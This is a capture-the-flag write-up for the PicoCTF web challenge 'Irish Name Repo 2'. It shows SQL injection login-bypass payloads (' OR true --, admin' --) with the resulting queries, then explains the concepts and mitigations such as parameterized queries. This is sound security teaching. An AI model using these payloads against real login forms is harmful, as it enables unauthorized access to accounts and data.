# PicoCTF - Irish Name Repo 2 (Web Exploitation)

--- 

## Challenge Link
[Irish Name Repo 2 CTF Link](https://play.picoctf.org/practice/challenge/59?category=1&page=1&search=irish&solved=0)

## Overview
This is a part two for the first web exploitation challenge focused on input validation with stricter security.
The goal is to bypass an admin login page by identifying and exploiting insecure database queries
used to verify user credentials, after a strengthened security system.

---

## Attack / Solution
1. I attempted my initial SQL injection from the first problem:
```sql
username: ' OR true OR '
password: ' OR true OR '
```
To which I was given the response:
```sql
username: ' OR true OR '
password: ' OR true OR '
SQL query: SELECT * FROM users WHERE name='' OR true OR '' AND password='' OR true OR ''
SQLi detected.
```
2. Referring to the problem's hint, they mention the password is being filtered, not the user.
3. This suggests that SQL injection attempts should avoid modifying the password input.
4. Since the password field is filtered, I focused on injecting only through the username field.
5. My second attempt was using `' OR true -- ` to comment out and avoid injecting into password:
```sql
username: ' OR true --
password: ''
```
To which I was given the response:
```sql
username: ' OR true --
password: ''
SQL query: SELECT * FROM users WHERE name='' OR true --' AND password=''
SQLi detected.
```
6. This implies words such as `OR` and other common SQL keywords are being filtered out.
7. It also means logging in requires matching an existing username, not just bypassing the password.
8. Because commenting out the password only works if the username exists in the database, I tried:
```sql
username: admin' --
password: 
SQL query: SELECT * FROM users WHERE name='admin' --' AND password=''
Logged in!
```
---

## Key Concepts Explained
### SQL Injection
SQL injection occurs when user input is inserted directly into a database query without proper validation.
This allows attackers to modify the structure or logic of the query itself rather than supplying expected data.

### Authentication Logic
Many login systems rely solely on whether a database query returns any rows.
If the query logic is altered to always return a result, authentication can be bypassed entirely.

### Debug Information Disclosure
Exposing debugging features in production environments can reveal sensitive internal logic,
such as database queries, which greatly lowers the barrier for exploitation.

---

## Tools Used
- Browser developer tools
- Source Inspection
- SQL Injection

---

## Lessons Learned
- Authentication mechanisms should never rely on unsanitized user input.
- Debug features must be removed or disabled before deployment.
- Understanding how backend queries are constructed is critical for identifying vulnerabilities.
- SQL injection is fundamentally a logic vulnerability, not a brute force attack.

---

## Security Implications
This challenge shows how improper input handling and debugging disclosure can compromise authentication systems.
Even simple login forms can become critical vulnerabilities if database queries are constructed insecurely.

---

## Mitigation
- Use prepared statements or parameterized queries.
- Never expose debugging information to users.
- Validate and sanitize all user input.
- Implement additional authentication safeguards beyond a single database check.

---


